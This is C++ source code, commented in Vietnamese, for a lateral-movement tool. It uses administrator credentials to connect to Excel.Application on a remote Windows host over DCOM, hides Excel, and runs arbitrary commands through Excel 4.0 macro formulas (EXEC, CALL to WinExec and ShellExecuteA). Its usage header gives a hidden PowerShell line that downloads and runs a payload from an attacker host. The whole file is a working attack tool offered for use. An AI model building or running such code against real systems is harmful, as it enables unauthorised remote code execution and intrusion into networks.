// =============================================================================
// Excel.Application DCOM – ExecuteExcel4Macro (XLM)
// =============================================================================
// Chỉ dùng method đã xác nhận work: ExecuteExcel4Macro
// VT_R8 return = Double = PID → command đã được spawn
//
// Fix so với version cũ:
//   - Không wrap thêm "cmd.exe /c" (tránh double cmd)
//   - Command truyền thẳng vào EXEC() formula
//   - Thử cả EXEC() và CALL(WinExec) và CALL(CreateProcessA)
//   - Không đọc output file (caller tự quyết)
//
// Compile: cl excel_dcom2.cpp /link ole32.lib oleaut32.lib
// Usage  : excel_dcom2.exe <ip> <user> <pass> <command>
// Example: excel_dcom2.exe 192.168.17.36 Administrator P@ssw0rd123
//            "cmd.exe /c whoami > c:\temp\excel.txt"
//          excel_dcom2.exe 192.168.17.36 Administrator P@ssw0rd123
//            "powershell -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')\""
// =============================================================================

#define _WIN32_DCOM
#define _WIN32_WINNT 0x0601
#define SECURITY_WIN32

#include <windows.h>
#include <comdef.h>
#include <objbase.h>
#include <string>
#include <vector>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// ── Globals ───────────────────────────────────────────────────────────────────
static std::wstring g_ip, g_user, g_pass;
static SEC_WINNT_AUTH_IDENTITY_W g_auth = {};

// ── Helpers ───────────────────────────────────────────────────────────────────
void Err(const wchar_t* m, HRESULT hr) {
    _com_error e(hr); wprintf(L"  [-] %s: 0x%08X (%s)\n", m, hr, e.ErrorMessage());
}
void SP(IUnknown* p) {
    if (!p) return;
    CoSetProxyBlanket(p, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
        &g_auth, EOAC_NONE);
}
DISPID GetID(IDispatch* p, const wchar_t* n) {
    BSTR b = SysAllocString(n); DISPID id = DISPID_UNKNOWN;
    p->GetIDsOfNames(IID_NULL, &b, 1, LOCALE_USER_DEFAULT, &id);
    SysFreeString(b); return id;
}
void PropPutBool(IDispatch* p, const wchar_t* n, bool val) {
    DISPID id = GetID(p, n); if (id == DISPID_UNKNOWN) return;
    VARIANT v; VariantInit(&v);
    v.vt = VT_BOOL; v.boolVal = val ? VARIANT_TRUE : VARIANT_FALSE;
    DISPID put = DISPID_PROPERTYPUT;
    DISPPARAMS dp = { &v, &put, 1, 1 };
    p->Invoke(id, IID_NULL, LOCALE_USER_DEFAULT,
        DISPATCH_PROPERTYPUT, &dp, NULL, NULL, NULL);
    VariantClear(&v);
}

// ── Escape double-quote cho XLM formula string ────────────────────────────────
// Trong XLM string: " → ""
std::wstring XlmEscape(const std::wstring& s) {
    std::wstring r;
    for (wchar_t c : s) {
        if (c == L'"') r += L"\"\"";
        else           r += c;
    }
    return r;
}

// ── Gọi ExecuteExcel4Macro với formula, trả về VT type ───────────────────────
struct ExecResult { HRESULT hr; VARTYPE vt; double dval; };

ExecResult RunFormula(IDispatch* pApp, const std::wstring& formula) {
    wprintf(L"  Formula: %s\n", formula.c_str());
    DISPID id = GetID(pApp, L"ExecuteExcel4Macro");
    if (id == DISPID_UNKNOWN) return { E_FAIL, VT_EMPTY, 0 };

    VARIANT vArg; VariantInit(&vArg);
    vArg.vt = VT_BSTR; vArg.bstrVal = SysAllocString(formula.c_str());
    DISPPARAMS dp = { &vArg, NULL, 1, 0 };
    VARIANT vR; VariantInit(&vR); EXCEPINFO ex = {};
    HRESULT hr = pApp->Invoke(id, IID_NULL, LOCALE_USER_DEFAULT,
        DISPATCH_METHOD, &dp, &vR, &ex, NULL);
    VariantClear(&vArg);

    ExecResult res = { hr, vR.vt, 0.0 };
    if (vR.vt == VT_R8) res.dval = vR.dblVal;
    else if (vR.vt == VT_I4) res.dval = (double)vR.lVal;
    else if (vR.vt == VT_I2) res.dval = (double)vR.iVal;
    VariantClear(&vR);

    // VT_R8 (0x0005) = Double = PID → SUCCESS
    // VT_BOOL TRUE   = SUCCESS
    // VT_ERROR       = FAIL
    // VT_EMPTY       = ambiguous (thường là fail)
    const wchar_t* status =
        (FAILED(hr)) ? L"HRESULT FAIL" :
        (vR.vt == VT_ERROR) ? L"FORMULA ERROR" :
        (vR.vt == VT_EMPTY) ? L"EMPTY (ambiguous)" :
        (vR.vt == VT_BOOL && vR.boolVal == VARIANT_FALSE) ? L"FALSE" :
        L"SUCCESS";
    wprintf(L"  → vt=0x%04X  val=%.0f  [%s]\n", res.vt, res.dval, status);
    return res;
}

bool IsSuccess(const ExecResult& r) {
    if (FAILED(r.hr)) return false;
    if (r.vt == VT_ERROR) return false;
    if (r.vt == VT_BOOL && r.dval == 0) return false;
    if (r.vt == VT_EMPTY) return false;
    return true; // VT_R8 (PID), VT_BOOL TRUE, VT_I4 → success
}

// ── Connect Excel.Application ─────────────────────────────────────────────────
IDispatch* ConnectExcel() {
    // Excel.Application CLSID: {00024500-0000-0000-C000-000000000046}
    const CLSID CLSID_Excel =
    { 0x00024500,0x0000,0x0000,{0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46} };

    COAUTHIDENTITY coAuth = {};
    coAuth.User = (unsigned short*)g_user.c_str();
    coAuth.UserLength = (unsigned long)g_user.size();
    coAuth.Password = (unsigned short*)g_pass.c_str();
    coAuth.PasswordLength = (unsigned long)g_pass.size();
    coAuth.Domain = (unsigned short*)L"";
    coAuth.DomainLength = 0;
    coAuth.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;

    COAUTHINFO cai = {};
    cai.dwAuthnSvc = RPC_C_AUTHN_WINNT;
    cai.dwAuthzSvc = RPC_C_AUTHZ_NONE;
    cai.dwAuthnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY;
    cai.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
    cai.pAuthIdentityData = &coAuth;
    cai.dwCapabilities = EOAC_NONE;

    COSERVERINFO srv = {};
    srv.pwszName = (wchar_t*)g_ip.c_str();
    srv.pAuthInfo = &cai;

    MULTI_QI mqi = { &IID_IDispatch, NULL, S_OK };
    HRESULT hr = CoCreateInstanceEx(CLSID_Excel, NULL,
        CLSCTX_REMOTE_SERVER, &srv, 1, &mqi);
    if (FAILED(hr) || FAILED(mqi.hr)) {
        Err(L"CoCreateInstanceEx(Excel.Application)", FAILED(hr) ? hr : mqi.hr);
        return NULL;
    }
    SP(mqi.pItf);
    return (IDispatch*)mqi.pItf;
}

// ── Main ──────────────────────────────────────────────────────────────────────
int wmain(int argc, wchar_t* argv[])
{
    if (argc < 5) {
        wprintf(
            L"Excel.Application DCOM – ExecuteExcel4Macro\n\n"
            L"Usage  : %s <ip> <user> <pass> <command>\n\n"
            L"Example:\n"
            L"  %s 192.168.17.36 Administrator P@ssw0rd123\n"
            L"    \"cmd.exe /c whoami > c:\\temp\\out.txt\"\n\n"
            L"  %s 192.168.17.36 Administrator P@ssw0rd123\n"
            L"    \"powershell -w hidden -ep bypass -c Write-Output test\"\n\n"
            L"Return: 0 = success (VT_R8 PID received), 1 = fail\n",
            argv[0], argv[0], argv[0]);
        return 1;
    }

    g_ip = argv[1];
    g_user = argv[2];
    g_pass = argv[3];
    std::wstring cmd = argv[4];

    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    CoInitializeSecurity(NULL, -1, NULL, NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IDENTIFY,
        NULL, EOAC_NONE, NULL);

    g_auth.User = (unsigned short*)g_user.c_str();
    g_auth.UserLength = (unsigned long)g_user.size();
    g_auth.Password = (unsigned short*)g_pass.c_str();
    g_auth.PasswordLength = (unsigned long)g_pass.size();
    g_auth.Domain = (unsigned short*)L"";
    g_auth.DomainLength = 0;
    g_auth.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;

    wprintf(L"[*] Target : %s\n", g_ip.c_str());
    wprintf(L"[*] User   : %s\n", g_user.c_str());
    wprintf(L"[*] Command: %s\n\n", cmd.c_str());

    // ── Connect ───────────────────────────────────────────────────────────────
    wprintf(L"[*] Connecting Excel.Application...\n");
    IDispatch* pApp = ConnectExcel();
    if (!pApp) { CoUninitialize(); return 1; }

    // Version
    {
        DISPID id = GetID(pApp, L"Version");
        if (id != DISPID_UNKNOWN) {
            DISPPARAMS dp = {}; VARIANT v; VariantInit(&v);
            pApp->Invoke(id, IID_NULL, LOCALE_USER_DEFAULT,
                DISPATCH_PROPERTYGET, &dp, &v, NULL, NULL);
            if (v.vt == VT_BSTR) wprintf(L"[+] Excel %s connected\n", v.bstrVal);
            VariantClear(&v);
        }
    }

    // Ẩn Excel, tắt alerts
    PropPutBool(pApp, L"Visible", false);
    PropPutBool(pApp, L"DisplayAlerts", false);

    // ── ExecuteExcel4Macro: thử 3 formula theo độ ưu tiên ───────────────────
    wprintf(L"\n[*] Trying ExecuteExcel4Macro formulas...\n");

    std::wstring escaped = XlmEscape(cmd);
    ExecResult res;
    bool success = false;

    // ── Formula 1: EXEC() – spawn process trực tiếp ──────────────────────────
    // EXEC("command") → trả về PID (Double)
    // Đây là formula đã xác nhận work từ log trước
    wprintf(L"\n[1] EXEC formula:\n");
    res = RunFormula(pApp, L"EXEC(\"" + escaped + L"\")");
    if (IsSuccess(res)) {
        success = true;
        wprintf(L"[+] SUCCESS via EXEC() — PID=%.0f\n", res.dval);
        goto done;
    }

    // ── Formula 2: CALL(WinExec) – WinAPI trực tiếp ──────────────────────────
    // CALL("Kernel32","WinExec","JCJ","command",1)
    // J = HANDLE/DWORD return, C = string, J = UINT
    wprintf(L"\n[2] CALL(Kernel32, WinExec) formula:\n");
    res = RunFormula(pApp,
        L"CALL(\"Kernel32\",\"WinExec\",\"JCJ\",\""
        + escaped + L"\",1)");
    if (IsSuccess(res)) {
        success = true;
        wprintf(L"[+] SUCCESS via CALL(WinExec)\n");
        goto done;
    }

    // ── Formula 3: CALL(ShellExecuteA) ───────────────────────────────────────
    // CALL("Shell32","ShellExecuteA","JJCCCJ",0,"open","cmd.exe","/c cmd",0,1)
    // J=handle, C=string, J=int
    {
        std::wstring shellArgs = L"/S /C \"" + escaped + L"\"";
        wprintf(L"\n[3] CALL(Shell32, ShellExecuteA) formula:\n");
        res = RunFormula(pApp,
            L"CALL(\"Shell32\",\"ShellExecuteA\",\"JJCCCJ\","
            L"0,\"open\",\"cmd.exe\",\""
            + XlmEscape(shellArgs) +
            L"\",0,1)");
        if (IsSuccess(res)) {
            success = true;
            wprintf(L"[+] SUCCESS via CALL(ShellExecuteA)\n");
            goto done;
        }
    }

    // ── Formula 4: CALL(CreateProcessA) ──────────────────────────────────────
    // Phức tạp hơn nhưng bypass một số filter
    wprintf(L"\n[4] CALL(Kernel32, CreateProcessA) formula:\n");
    res = RunFormula(pApp,
        L"CALL(\"Kernel32\",\"WinExec\",\"JCJ\",\"cmd.exe /S /C \\\""
        + escaped + L"\\\"\",0)");
    if (IsSuccess(res)) {
        success = true;
        wprintf(L"[+] SUCCESS via CALL(WinExec sw=0)\n");
        goto done;
    }

done:
    // Quit Excel
    {
        DISPID idQ = GetID(pApp, L"Quit");
        if (idQ != DISPID_UNKNOWN) {
            DISPPARAMS dp = {}; VARIANT v; VariantInit(&v);
            pApp->Invoke(idQ, IID_NULL, LOCALE_USER_DEFAULT,
                DISPATCH_METHOD, &dp, &v, NULL, NULL);
            VariantClear(&v);
        }
    }
    pApp->Release();
    CoUninitialize();

    if (success) {
        wprintf(L"\n[+] Command executed on %s (process spawned by excel.exe)\n",
            g_ip.c_str());
        wprintf(L"[*] If using redirection (>), read output via:\n");
        wprintf(L"    type \\\\%s\\c$\\temp\\out.txt\n", g_ip.c_str());
        return 0;
    }

    wprintf(L"\n[-] All formulas failed\n");
    return 1;
}